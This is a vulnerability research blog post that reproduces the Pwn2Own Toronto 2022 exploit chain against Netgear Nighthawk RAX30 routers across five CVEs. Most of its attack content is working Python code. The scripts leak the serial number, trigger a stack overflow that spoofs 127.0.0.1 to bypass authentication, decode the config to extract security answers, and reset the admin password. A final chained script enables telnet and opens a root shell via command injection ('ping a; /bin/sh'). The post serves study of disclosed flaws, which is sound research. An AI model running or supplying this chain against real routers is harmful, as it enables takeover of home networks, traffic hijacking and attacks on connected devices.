---
title: PoC Of Pwn2Own Toronto 22 Exploit Netgear Nighthawk RAX30 Routers
date: 2025-07-23 10:30 +0700
categories: [CVE_Analysis, IOT]
tags: [iot, CVE, pwnable, binary, reversing]
author: HoangNhoo
math: true
image:
  path: /assets/img/Netgear-Nighthawk-RAX30/router.png
---

## 1. Executive Summary

Team82 disclosed five vulnerabilities in [NETGEAR’s Nighthawk RAX30](https://www.netgear.com/home/wifi/routers/rax30/) routers as part of its research and participation in 2022 [Pwn2Own Toronto hacking competition](https://www.zerodayinitiative.com/blog/2022/12/5/pwn2own-toronto-2022-day-one-results).

Successful exploits could allow attackers to monitor users' internet activity, hijack internet connections and redirect traffic to malicious websites or inject malware into network traffic. 

An attacker could also use these vulnerabilities to access and control networked smart devices (security cameras, thermostats, smart locks), change router settings including credentials or DNS settings, or use a compromised network to launch attacks against other devices or networks. 

## 2. Introduction

This document details the analysis and reproduction of a remote code execution (RCE) vulnerability in the Netgear Nighthawk RAX30 router. As a practical exercise in vulnerability research, this project represents a first-hand effort to deconstruct a real-world exploit, moving from initial target analysis to achieving root-level access. The following sections will outline the methodology used to identify the vulnerable code path, craft a malicious payload, and develop a functional proof-of-concept (PoC) exploit.

## 3. Target Analysis

### 3.1. Device & Firmware Information

* **Device Model**: Netgear Nighthawk RAX30.
* **Firmware Version**: `V1.0.7.78.1`.

### 3.2. Blogs & Researchs

* https://claroty.com/team82/research/chaining-five-vulnerabilities-to-exploit-netgear-nighthawk-rax30-routers-at-pwn2own-toronto-2022
* https://www.nccgroup.com/sg/research-blog/netgear-routers-a-playground-for-hackers/
* https://openwrt.org/toh/netgear/telnet.console#for_newer_netgear_routers_that_accept_probe_packet_over_udp_ex2700_r6700_r7000_and_r7500

### 3.3. Vulnerability Overview

In summary, the full-chain RCE of NETGEAR RAX30 router uses exactly 5 vulnerabilities for a complete exploit, with the exact order I list below:

* [**CVE-2023-27357**](https://claroty.com/team82/disclosure-dashboard/cve-2023-27357): Some SOAP service don't need to authenticate to use, one of them is `DeviceInfo#GetInfo`. This one didn’t reveal much sensitive information, but will be much useful in later.
* [**CVE-2023-27368**](https://claroty.com/team82/disclosure-dashboard/cve-2023-27368): Stack-based buffer overflow authentication bypass. `soap_serverd` reads the HTTP headers first and then proceeds to parse them using the sscanf function to extract the HTTP method, path, and protocol version. It doesn't validate the length of HTTP headers and it leads to buffer overflow.
* [**CVE-2023-27369**](https://claroty.com/team82/disclosure-dashboard/cve-2023-27369): in the SSL flow, the read function doesn’t check how many bytes were read, which could lead to a buffer overflow. Using the stack overflow to overwrite the socket IP to 127.0.0.1 we are able to make the server think the request was generated locally, bypass authentication and run any `soap_serverd` command.
* [**CVE-2023-27370**](https://claroty.com/team82/disclosure-dashboard/cve-2023-27370): Using `soap_serverd` auth Bypass to Reset the Admin Password: using above vulnerabilities, we can use any api/service and get all information to reset admin password.
* [**CVE-2023-27367**](https://claroty.com/team82/disclosure-dashboard/cve-2023-27367): In the past, researchers have discovered a "magic packet" that can enable Telnet on NETGEAR routers by enabling port 23 TCP in the firewall, not excluding RAX30 model.

## 4. NETGEAR Nighthawk RAX30 Vulnerability Details

### 4.1. So, what does `soap_serverd` do?

#### 4.1.1. SSL or not?
Let's break down the program and go through each part to have an observe about how the `soap_serverd` works.

![image](https://hackmd.io/_uploads/rJHJYairxx.png)

You can see that the `-n` parameters does not declare in the usage. This parameters will be the value of `modeFlag` variable.

![image](https://hackmd.io/_uploads/HJXPc6oHel.png)

The `modeFlag` variable is used by `initFlag()` function. This function decides the server to serve with SSL or not. I will not go deeper into this function.

In `soap_server_main_handler()`, the server will listening, the main logic of the server start here.

#### 4.1.2. How does `soap_serverd` handle our request?

I will go through this fast, without notice about the vulnerabilities.

![image](https://hackmd.io/_uploads/BklTNBmLee.png)

The process begins when the daemon reads the first line of an incoming HTTP request into a memory buffer named req_buffer. This operation correctly handles both standard HTTP and encrypted HTTPS connections, depending on the port the request was received on ([SSL or not](#4.1.1.-SSL-or-not?)).

![image](https://hackmd.io/_uploads/HyVXTpjHxe.png)

The content of `req_buffer` (the HTTP request line) is then parsed to separate it into three components: `method`, `path`, and `protocol`. The code immediately validates that the `method` is POST, as SOAP actions are exclusively handled via POST requests.

![image](https://hackmd.io/_uploads/SJxDBB7Ule.png)

Next, the daemon iterates through the HTTP headers to extract crucial information. While it parses headers like `Content-Length` and `Cookie`, the most significant for routing logic is the `SOAPAction` header.

![image](https://hackmd.io/_uploads/rkeyeAiHgl.png)

The value of the `SOAPAction` is determining which internal function to execute. The daemon expects this header to contain a URN (Uniform Resource Name) followed by a hash symbol `'#'` and an `action_name`.

![image](https://hackmd.io/_uploads/rJkakCjSgl.png)

As shown in the disassembly, the code specifically searches for the `'#'` character. The substring that follows this delimiter is extracted as the action_name. This name is then used to look up the corresponding function from a predefined table of API handlers, effectively dispatching the request to the correct internal code path.

### 4.2. Issue No. 1: [CVE-2023-27357](https://claroty.com/team82/disclosure-dashboard/cve-2023-27357) NETGEAR RAX30 GetInfo Missing Authentication Information Disclosure Vulnerability

![image](https://hackmd.io/_uploads/r1YdhrmIll.png)

One of the few commands that does not require authentication is `GetInfo`. In the `Get` response, we can find details about the device such as the model, serial number, and more.

The following Python script demonstrates how to send a crafted SOAP request to trigger the `GetInfo` action and leak the information.

```python
import argparse
from pwn import *

parser = argparse.ArgumentParser(description="Exploit for CVE-2023-27357")
parser.add_argument("--remote", "-r", type=str, required=True, help="router IP address")
args = parser.parse_args()
IP = args.remote

remote_connection = f"nc {IP} 5000".split()

p = remote(remote_connection[1], int(remote_connection[2]), ssl=False)

payload = b'''POST / HTTP/1.1
Content-Length: 577
SOAPAction: "DeviceInfo#GetInfo"

'''

p.sendline(payload)
info(p.recvall().decode())
p.close()

```

This serial number is not merely descriptive data; it is used internally by the router as a form of "secret" or nonce to authorize subsequent, more sensitive administrative actions. Therefore, obtaining it is the key to bypassing other security checks.

![image](https://hackmd.io/_uploads/B1sPZI78le.png)

### 4.3. Issue No. 2: [CVE-2023-27368](https://claroty.com/team82/disclosure-dashboard/cve-2023-27368): NETGEAR RAX30 `soap_serverd` Stack-based Buffer Overflow Authentication Bypass Vulnerability

To handle communication, `soap_serverd` reads the HTTP headers first and then proceeds to parse them using the `sscanf` function to extract the HTTP `method`, `path`, and `protocol` version.

![image](https://hackmd.io/_uploads/HyVXTpjHxe.png)

The server does not check the length of the `method`, `path`, and `protocol` fields meaning we can overflow them and overwrite data on the stack.

Unfortunately the HTTP receive function over TCP port 5000 limits the size of the HTTP header, thus limiting the amount of data we can overflow. In order to avoid that limitation we used something a bit different. 

### 4.4. Issue No. 3: [CVE-2023-27369](https://claroty.com/team82/disclosure-dashboard/cve-2023-27369): NETGEAR RAX30 `soap_serverd` Stack-based Buffer Overflow Authentication Bypass Vulnerability

The `soap_serverd` binary listens for incoming messages on two ports:

* 5000
* 5043 (SSL)

Different `socket read` and `socket write` functions are called depending on the port that the SOAP message was sent to.

![image](https://hackmd.io/_uploads/Byl4qU78xl.png)

In the SSL flow, when reading the SOAP message headers, the server reads data from the socket one byte at a time. We can easily see that it is read until the char is `\n`, which could lead to a buffer overflow.

We can use this vulnerability to write long buffers on the stack while bypassing the overall buffer-size limit. If we use SSL to send the SOAP message, we are not limited in size (due to the stack overflow mentioned above) meaning we can overwrite as much data as we want.

#### Bypassing Stack Canaries

Now that we understand the `sscanf` vulnerability and can trigger it without any limitations on how much data we can overwrite, we are left with only one issue:  the stack canneries. Once we overwrite data from the stack and right before the function that handles HTTP requests returns, the stack canary is checked and crashes the program.

Stack canaries are set at the beginning of functions that have the potential for an overflow, but are checked only at the end of the frame. This means that by using the `sscanf` overflow, we can overwrite the canary, finish the request handling and response flow and only then get to the end of the function where the canary is checked.


<div style="text-align:center">
    <img src="/assets/img/Netgear-Nighthawk-RAX30/canary.png" />
</div>

Since most of the SOAP commands require authentication, we focused on trying to bypass the authentication flow.

![image](https://hackmd.io/_uploads/B1-LCLmUeg.png)

The first thing the server checks when authenticating users is whether the request came from `127.0.0.1` (`localhost`). Requests coming from localhost do not require authentication. Luckily, the socket source IP is stored on the stack in an offset we can overwrite with our stack overflow.

![image](https://hackmd.io/_uploads/HJPruYmUex.png)

#### Calculating Offset

In the below explanation, note that the address of `.text` is dynamic, this is just for calculate offset between `current_client_ip_str` and `req_buffer`. Debug images below giving us a better insight.

![image](https://hackmd.io/_uploads/H1RwkcQLgg.png)

We begin by setting a breakpoint at the read_line_request function. According to the ARM calling convention, the first argument to a function is passed in the `R0` register. In this debugging session, `R0` contains the address `0xbecc89a4`, which is the starting location of our input buffer, `req_buffer`.

![image](https://hackmd.io/_uploads/B1dblqQLll.png)

Next, we inspect the checkAuthenticated function. The disassembly shows a comparison that validates the string at a specific memory location against `"127.0.0.1"`. By examining the registers at this point, we find that the `current_client_ip_str` is stored at address `0xbeccbb30`.

![image](https://hackmd.io/_uploads/B1OQlc7Lxe.png)

With both addresses identified, we can calculate the distance between them: `current_client_ip_str` is `0x318c` after `req_buffer`.

#### Bypassing Authentication

Now that we have the offset, we can construct a payload to trigger the overflow and bypass the authentication.

```python
from pwn import *
import argparse

parse = argparse.ArgumentParser(description='Exploit for CVE-2023-27369')
parse.add_argument("--remote", "-r", type=str, required=True, help="router IP address")
args = parse.parse_args()
IP = args.remote

remote_connection = f"nc {IP} 5043".split()

p = remote(remote_connection[1], int(remote_connection[2]), ssl=True)
payload = b'''POST / / '''
payload += cyclic(0x318c - len(payload)) + b'127.0.0.1\x00'
payload += b'''
Content-Length: 577 
SOAPAction: "DeviceConfig#GetConfigInfo"

'''
p.sendline(payload)
p.interactive()
```

The response contains `<NewConfigFile>` tag, it stores all of information that we need to perform the 4th issue, reset password. 

![image](https://hackmd.io/_uploads/HkfRI578gl.png)

#### Config File is compressed

But there is a problem, this config file is compressed, encoded with strange LZW algorithm and after all encoded with base64.

![image](https://hackmd.io/_uploads/Sk4WNs7Lee.png)


I will not go deep into `data_GenerateConfig`. The lzw algorithm is open-source and we can find it on github. 
[lzw_encode.c](https://github.com/Netgear/RAXE500/blob/d67c600a6139270907b6993ec9303108b14041e4/userspace/public/libs/cms_util/lzw_encode.c)

In summary, this is how `data_GenerateConfig` works and how the data in `<NewConfigFile>` distributed.

![image](https://hackmd.io/_uploads/B1j58s7Ule.png)

#### Decoding Config File

Luckily, the [lzw_decode.c](https://github.com/Netgear/RAXE500/blob/d67c600a6139270907b6993ec9303108b14041e4/userspace/public/libs/cms_util/lzw_decode.c) is open-source in the same github repository. The following code is how I use it. 

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <malloc.h>

#define LZW_MAXBITS        12
#define LZW_SIZTABLE       (1<<LZW_MAXBITS)
#define LZW_HASH_SIZE      16411
#define LZW_HASH_SHIFT     6

#define LZW_PREFIX_EMPTY   -1
#define LZW_PREFIX_FREE    -2

static const uint16_t mask[17] =
	{
		0x0000, 0x0001, 0x0003, 0x0007,
		0x000F, 0x001F, 0x003F, 0x007F,
		0x00FF, 0x01FF, 0x03FF, 0x07FF,
		0x0FFF, 0x1FFF, 0x3FFF, 0x7FFF, 0xFFFF
	};


enum FF_LZW_MODES{
	FF_LZW_GIF,
	FF_LZW_TIFF
};

typedef struct {
	uint8_t *pbuf, *ebuf;
	int bbits;
	unsigned int bbuf;

	int mode;                   ///< Decoder mode
	int cursize;                ///< The current code size
	int curmask;
	int codesize;
	int clear_code;
	int end_code;
	int newcodes;               ///< First available code
	int top_slot;               ///< Highest code for current size
	int extra_slot;
	int slot;                   ///< Last read code
	int fc, oc;
	uint8_t *sp;
	uint8_t stack[LZW_SIZTABLE];
	uint8_t suffix[LZW_SIZTABLE];
	uint16_t prefix[LZW_SIZTABLE];
	int bs;                     ///< current buffer size for GIF
} LZWDecoderState;

typedef enum
{
	CMSRET_SUCCESS              = 0,     /**<Success. */
	CMSRET_METHOD_NOT_SUPPORTED = 9000,  /**<Method not supported. */
	CMSRET_REQUEST_DENIED       = 9001,  /**< Request denied (no reason specified). */
	CMSRET_INTERNAL_ERROR       = 9002,  /**< Internal error. */
	CMSRET_INVALID_ARGUMENTS    = 9003,  /**< Invalid arguments. */
	CMSRET_RESOURCE_EXCEEDED    = 9004,  /**< Resource exceeded.
					*  (when used in association with
					*  setParameterValues, this MUST not be
					*  used to indicate parameters in error)
					*/
	CMSRET_INVALID_PARAM_NAME   = 9005,  /**< Invalid parameter name.
					*  (associated with set/getParameterValues,
					*  getParameterNames,set/getParameterAtrributes)
					*/
	CMSRET_INVALID_PARAM_TYPE   = 9006,  /**< Invalid parameter type.
					*  (associated with set/getParameterValues)
					*/
	CMSRET_INVALID_PARAM_VALUE  = 9007,  /**< Invalid parameter value.
					*  (associated with set/getParameterValues)
					*/
	CMSRET_SET_NON_WRITABLE_PARAM = 9008,/**< Attempt to set a non-writable parameter.
					*  (associated with setParameterValues)
					*/
	CMSRET_NOTIFICATION_REQ_REJECTED = 9009, /**< Notification request rejected.
					    *  (associated with setParameterAttributes)
					    */
	CMSRET_DOWNLOAD_FAILURE     = 9010,  /**< Download failure.
					 *  (associated with download or transferComplete)
					 */
	CMSRET_UPLOAD_FAILURE       = 9011,  /**< Upload failure.
					*  (associated with upload or transferComplete)
					*/
	CMSRET_FILE_TRANSFER_AUTH_FAILURE = 9012,  /**< File transfer server authentication
					      *  failure.
					      *  (associated with upload, download
					      *  or transferComplete)
					      */
	CMSRET_UNSUPPORTED_FILE_TRANSFER_PROTOCOL = 9013,/**< Unsupported protocol for file
						    *  transfer.
						    *  (associated with upload or
						    *  download)
						    */


	CMSRET_SUCCESS_REBOOT_REQUIRED = 9800, /**< Config successful, but requires reboot to take effect. */
	CMSRET_SUCCESS_UNRECOGNIZED_DATA_IGNORED = 9801,  /**<Success, but some unrecognized data was ignored. */
	CMSRET_SUCCESS_OBJECT_UNCHANGED = 9802,  /**<Success, furthermore object has not changed, returned by STL handler functions. */
	CMSRET_FAIL_REBOOT_REQUIRED = 9803,  /**<Config failed, and now system is in a bad state requiring reboot. */
	CMSRET_NO_MORE_INSTANCES = 9804,     /**<getnext operation cannot find any more instances to return. */
	CMSRET_MDM_TREE_ERROR = 9805,         /**<Error during MDM tree traversal */
	CMSRET_WOULD_DEADLOCK = 9806, /**< Caller is requesting a lock while holding the same lock or a different one. */
	CMSRET_LOCK_REQUIRED = 9807,  /**< The MDM lock is required for this operation. */
	CMSRET_OP_INTR = 9808,      /**<Operation was interrupted, most likely by a Linux signal. */
	CMSRET_TIMED_OUT = 9809,     /**<Operation timed out. */
	CMSRET_DISCONNECTED = 9810,  /**< Communications link is disconnected. */
	CMSRET_MSG_BOUNCED = 9811,   /**< Msg was sent to a process not running, and the
				 *   bounceIfNotRunning flag was set on the header.  */
	CMSRET_OP_ABORTED_BY_USER = 9812,  /**< Operation was aborted/discontinued by the user */
	CMSRET_RECURSION_ERROR = 9817,     /**< too many levels of recursion */
	CMSRET_OPEN_FILE_ERROR = 9818,     /**< open file error */
	CMSRET_KEY_GENERATION_ERROR = 9830,     /** certificate key generation error */
	CMSRET_INVALID_CERT_REQ = 9831,     /** requested certificate does not match with issued certificate */
	CMSRET_INVALID_CERT_SUBJECT = 9832,     /** certificate has invalid subject information */
	CMSRET_OBJECT_NOT_FOUND = 9840,     /** failed to find object */

	CMSRET_INVALID_FILENAME = 9850,  /**< filename was not given for download */
	CMSRET_INVALID_IMAGE = 9851,     /**< bad image was given for download */
	CMSRET_INVALID_CONFIG_FILE = 9852,  /**< invalid config file was detected */
	CMSRET_CONFIG_PSI = 9853,         /**< old PSI/3.x config file was detected */
	CMSRET_IMAGE_FLASH_FAILED = 9854, /**< could not write the image to flash */

} CmsRet;

/* get one code from stream */
static int lzw_get_code(LZWDecoderState *s)
{
	int c;

	/* always use TIFF mode */

	while (s->bbits < s->cursize) {
		s->bbuf = (s->bbuf << 8) | (*s->pbuf++);
		s->bbits += 8;
	}
	//    printf("TIFF: bbuf=0x%08x bbits=%d cursize=%d\n", s->bbuf, s->bbits, s->cursize);
	c = s->bbuf >> (s->bbits - s->cursize);

	s->bbits -= s->cursize;

	//    printf("bbits=%d c=0x%08x curmask=0x%08x\n", s->bbits, c, s->curmask);
	return c & s->curmask;
}


void ff_lzw_decode_tail(LZWDecoderState *s)
{
	/* always use TIFF mode */
	s->pbuf= s->ebuf;
}


CmsRet cmsLzw_initDecoder(LZWDecoderState **p, uint8_t *inbuf, uint32_t inbuf_size)
{
	LZWDecoderState *s;
	int mode = FF_LZW_TIFF;  /* always use TIFF mode */
	int csize = 8;  /* the encoder side has this hardcoded, so hardcode here too */

	*p = (LZWDecoderState *) malloc(sizeof(LZWDecoderState));
	if (*p == NULL)
	{
		// cmsLog_error("could not allocate %d bytes for decoder state", sizeof(LZWDecoderState));
		return CMSRET_RESOURCE_EXCEEDED;
	}
	else
{
		// cmsLog_debug("%d bytes allocated for decoder state", sizeof(LZWDecoderState));
	}

	s = *p;

	/* read buffer */
	s->pbuf = inbuf;
	s->ebuf = s->pbuf + inbuf_size;
	s->bbuf = 0;
	s->bbits = 0;
	s->bs = 0;

	/* decoder */
	s->codesize = csize;
	s->cursize = s->codesize + 1;
	s->curmask = mask[s->cursize];
	s->top_slot = 1 << s->cursize;
	s->clear_code = 1 << s->codesize;
	s->end_code = s->clear_code + 1;
	s->slot = s->newcodes = s->clear_code + 2;
	s->oc = s->fc = -1;
	s->sp = s->stack;

	s->mode = mode;
	s->extra_slot = (s->mode == FF_LZW_TIFF);

	return CMSRET_SUCCESS;
}


int32_t cmsLzw_decode(LZWDecoderState *s, uint8_t *outbuf, uint32_t outlen)
{
	uint32_t l;
	int c, code, oc, fc;
	uint8_t *sp;

	if (s->end_code < 0)
		return -1;

	l = outlen;
	sp = s->sp;
	oc = s->oc;
	fc = s->fc;

	for (;;) {

		while (sp > s->stack) {
			//           printf("transfer stack to buf, sp=0x%02x buf=%p\n", *sp, outbuf);
			*outbuf++ = *(--sp);
			if ((--l) == 0)
				goto the_end;
		}

		c = lzw_get_code(s);
		if (c == s->end_code) {
			// cmsLog_debug("got end code %d", c);
			break;
		} else if (c == s->clear_code) {
			// cmsLog_debug("got clear code %d", c);
			s->cursize = s->codesize + 1;
			s->curmask = mask[s->cursize];
			s->slot = s->newcodes;
			s->top_slot = 1 << s->cursize;
			fc= oc= -1;
		} else {
			code = c;
			//printf("got valid code %d (0x%02x)\n", c, c);

			if (code == s->slot && fc>=0) {
				*sp++ = fc;
				code = oc;
			}else if(code >= s->slot) {
				// cmsLog_error("code %d greater than slot %d", code, s->slot);
				break;
			}

			while (code >= s->newcodes) {
				//printf("transfer suffix to to sp \n");
				*sp++ = s->suffix[code];
				code = s->prefix[code];
			}

			//printf("sp=%p gets code %d\n", sp, code);
			*sp++ = code;


			if (s->slot < s->top_slot && oc>=0) {
				//                printf("suffix[%d]=%d prefix[%d]=%d\n", s->slot, code, s->slot, oc);
				s->suffix[s->slot] = code;
				s->prefix[s->slot++] = oc;
			}
			fc = code;
			oc = c;

			if (s->slot >= s->top_slot - s->extra_slot) {
				if (s->cursize < LZW_MAXBITS) {
					s->top_slot <<= 1;
					s->curmask = mask[++s->cursize];
					//printf("new top_slot=0x%x curmask=0x%x\n", s->top_slot, s->curmask);
				}
			}
		}
	}

	s->end_code = -1;
the_end:
	s->sp = sp;
	s->oc = oc;
	s->fc = fc;

	// cmsLog_debug("about to return, outlen=%d l=%d\n", outlen, l);
	return outlen - l;
}

void cmsLzw_cleanupDecoder(LZWDecoderState **s)
{
	free(*s);
	*s = NULL;
}

int main(int argc, char *argv[])
{
	if (argc < 2) {
		printf("Usage: %s <input_file>\n", argv[0]);
		return 1;
	}

	const char *input_file = argv[1];
	FILE *fp = fopen(input_file, "rb");
	if (!fp) {
		perror("Failed to open input file");
		return 1;
	}

	fseek(fp, 0, SEEK_END);
	long file_size = ftell(fp);
	fseek(fp, 0, SEEK_SET);

	char *buffer = (char *)malloc(file_size);
	if (!buffer) {
		perror("Failed to allocate memory for input buffer");
		fclose(fp);
		return 1;
	}

	if (fread(buffer, 1, file_size, fp) != file_size) {
		perror("Failed to read input file");
		free(buffer);
		fclose(fp);
		return 1;
	}
	fclose(fp);

	printf("Compressed file size: %ld bytes\n", file_size);

	char *decompressed_data = (char *)malloc(file_size * 10); // Allocate more space for decompression

	if (!decompressed_data) {
		perror("Failed to allocate memory for decompressed data");
		free(buffer);
		return 1;
	}

	LZWDecoderState *decoder_state;
	CmsRet ret = cmsLzw_initDecoder(&decoder_state, (uint8_t *)buffer + 0x7c, file_size - 0x7c);

	if (ret != CMSRET_SUCCESS) {
		printf("Failed to initialize LZW decoder: %d\n", ret);
		free(buffer);
		free(decompressed_data);
		return 1;
	}

	int32_t decompressed_size = cmsLzw_decode(decoder_state, (uint8_t *)decompressed_data, file_size * 10);
	if (decompressed_size < 0) {
		printf("Failed to decode LZW data\n");
		cmsLzw_cleanupDecoder(&decoder_state);
		free(buffer);
		free(decompressed_data);
		return 1;
	}

	printf("Decompressed data size: %d bytes\n", decompressed_size);
	cmsLzw_cleanupDecoder(&decoder_state);
	free(buffer);
	printf("LZW decompression completed successfully.\n");

	// store the decompressed data to a file
	FILE *output_fp = fopen("decompressed_output", "wb");
	if (!output_fp) {
		perror("Failed to open output file");
		return 1;
	}
	if (fwrite(decompressed_data, 1, decompressed_size, output_fp) != decompressed_size) {
		perror("Failed to write to output file");
		fclose(output_fp);
		return 1;
	}
	fclose(output_fp);
	printf("Decompressed data written to decompressed_output.bin\n");
	free(decompressed_data);
	cmsLzw_cleanupDecoder(&decoder_state);
	printf("All operations completed successfully.\n");
	return 0;

}
```

After decode and decompress the `<NewConfigFile>`, we can get bunch of config informations. 

![image](https://hackmd.io/_uploads/HyOUg2mLxg.png)

### 4.5. Issue No. 4: [CVE-2023-27370](https://claroty.com/team82/disclosure-dashboard/cve-2023-27370): Using soap_serverd auth Bypass to Reset the Admin Password

![image](https://hackmd.io/_uploads/r1oMzn7Igl.png)


After getting all information about Serial Number, Security Question. We can easily to request a password reset.

### 4.6. Issue No. 5: [CVE-2023-27367](https://claroty.com/team82/disclosure-dashboard/cve-2023-27367): Authentication Bypass to RCE Using Magic telnet and Command Injection

#### Magic Telnet

By default, the router's firewall blocks external access to the Telnet service (TCP port 23). However, a backdoor exists where a specially crafted UDP packet, sent to the router's port 23, can dynamically alter the firewall rules.

Further read on these link:

https://www.nccgroup.com/sg/research-blog/netgear-routers-a-playground-for-hackers/#telnet

https://openwrt.org/toh/netgear/telnet.console

![image](https://hackmd.io/_uploads/HyWU6lULgg.png)

![image](https://hackmd.io/_uploads/S1dTHgSLgl.png)

Upon receiving this "magic packet," the router's firmware executes an internal command, equivalent to `iptables -I INPUT -p tcp --dport 23 -j ACCEPT`, effectively opening the Telnet port for the attacker's IP address.

![image](https://hackmd.io/_uploads/Bkd4jGL8xg.png)


#### Command Injection

![image](https://hackmd.io/_uploads/BJP-CeIUxl.png)

The service processes user input by checking it against a predefined list of valid commands (`default_cmd_list`). If the submitted command is not found in this list, the firmware fails to sanitize the input and passes the entire command string directly to a `system()` or equivalent shell execution function.

![image](https://hackmd.io/_uploads/ryHbemU8xl.png)

I can do something like `ping a; /bin/sh` to get the shell.

## 5. Chaining 5 vulnerabilities - Goal to PreAuth RCE

![image](/assets/img/Netgear-Nighthawk-RAX30/chain.png)

The following script is my combine of all exploitations for all issue, allow getting the shell with just router's IP address.

```python
from pwn import *
import argparse

parser = argparse.ArgumentParser(description="Exploit script for Netgear vulnerabilities")
parser.add_argument('--remote', '-r', help='router IP', required=True)
parser.add_argument('--password', '-p', help='new router password', default='buymeacoffee123A@')

args = parser.parse_args()
IP = args.remote
PASSWORD = args.password


# CVE 1: Get Serial_Number

def get_tag_value(data, tag):
    start = data.index(f"<{tag}>") + len(tag) + 2
    end = data.index(f"</{tag}>")
    return data[start:end]

io = remote(IP, 5000, ssl=False)
payload = b'''POST / HTTP/1.1
Content-Length: 577
SOAPAction: "DeviceInfo#GetInfo"

'''

io.sendline(payload)
device_info = io.recvall().decode()
serial_number = get_tag_value(device_info, "SerialNumber")
info(f'Serial Number: {serial_number}')
io.close()

sleep(2)

# CVE 3: Get Device Config Info
io = remote(IP, 5043, ssl=True, timeout=5)
payload = b'''POST / / '''
payload += cyclic(0x318c - len(payload)) + b'127.0.0.1\x00'
payload += b'''
Content-Length: 577 
SOAPAction: "DeviceConfig#GetConfigInfo"

'''
io.sendline(payload)
device_config_info = io.recvall().decode()
config_info = get_tag_value(device_config_info, "NewConfigFile")
io.close()


# Base64 decode the config info and dump to a file (wb mode)
import base64
decoded_config_info = base64.b64decode(config_info)
with open('config_info.bin', 'wb') as f:
    f.write(decoded_config_info)
info("Config info saved to config_info.bin")

# LZW decompression the decoded config info

lzw = process(['./lzw_decoder', 'config_info.bin'])
log.info(lzw.recvall().decode())
lzw.close()

# Get the password from the decompressed data
config_info_decompressed = open('decompressed_output', 'r').read()

question1 = get_tag_value(config_info_decompressed, "SecurityQuestion1")
sec_ans1 = get_tag_value(config_info_decompressed, "SecurityAnswer1")
question2 = get_tag_value(config_info_decompressed, "SecurityQuestion2")
sec_ans2 = get_tag_value(config_info_decompressed, "SecurityAnswer2")

info(f"Security Question 1: {question1}")
info(f"Security Answer 1: {base64.b64decode(sec_ans1).decode()[:-1]}")
info(f"Security Question 2: {question2}")
info(f"Security Answer 2: {base64.b64decode(sec_ans2).decode()[:-1]}")

sleep(2)

# CVE 4: Reset Password

import requests
import urllib3

requests.packages.urllib3.disable_warnings()

def send_request(url, payload, auth=None):
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json"
    }
    if auth:
        response = requests.post(url, json=payload, headers=headers, auth=auth, verify=False)
    else:
        response = requests.post(url, json=payload, headers=headers, verify=False)
    response.raise_for_status()
    return response.json()

url = f"https://{IP}/pwd_reset/reset_pwd.cgi"

# Check Serial Number

payload = {
    "function": "checkSN",
    "data": {
        "serialNumber": "6L131CWE0007D"
    }
}

info(send_request(url, payload))

sleep(1)

# Security Questions

payload = {
    "function": "checkAnswer",
    "data": {
        "answer1": sec_ans1,
        "answer2": sec_ans2,
        "question1": question1,
        "question2": question2,
        "answer1_input": base64.b64decode(sec_ans1).decode()[:-1],
        "answer2_input": base64.b64decode(sec_ans2).decode()[:-1],

    }
}

info(send_request(url, payload))

sleep(1)

payload = {
    "function":"setPassword",
    "data": {
        "oldPassword":"",
        "password": base64.b64encode(f"{PASSWORD}".encode()).decode(),
        "question1":"1",
        "answer1": base64.b64encode(b'pwnedbyhoangnhoo').decode(),
        "question2":"1",
        "answer2": base64.b64encode(b'pwnedbyhoangnhoo').decode(),
        "resetPwd":"true",
        "enableReset":"true"
    }
}

info(send_request(url, payload))

sleep(1)

# Request to set password on html page

url = f"https://{IP}/cgi-bin/rex_cgi"

payload = {
    "function": "setPassword",
    "data": {
        "oldPassword": base64.b64encode(f"{PASSWORD}".encode()).decode(), 
        "password": base64.b64encode(f"{PASSWORD}".encode()).decode(),
        "enableReset": "true",
        "question1": "1",
        "answer1": base64.b64encode(b'pwnedbyhoangnhoo').decode(),
        "question2": "1",
        "answer2": base64.b64encode(b'pwnedbyhoangnhoo').decode()
    }
}

info(send_request(url, payload, auth=(f"admin", f"{PASSWORD}")))

sleep(1)

#CVE 5: Telnet Open
import os

command = f'./NetgearTelnetEnable/enable_telnet.py -ip {IP} -p 23 -u admin -w {PASSWORD} -m "6C:CD:D6:51:31:41"'
os.system(command)

sleep(2)
io = remote(IP, 23)
sla = io.sendlineafter
sa = io.sendafter

sla(b"Login: ", b"admin")
sla(b"Password: ", f"{PASSWORD}".encode())
sla(b"> ", b"sh")

io.interactive()
```

## 6. What have I learned from this experience?

* Remote debug with router.
* Reversing skill with ARM architecture: **ida shifted-pointer**, wrote a symbol finding tool.
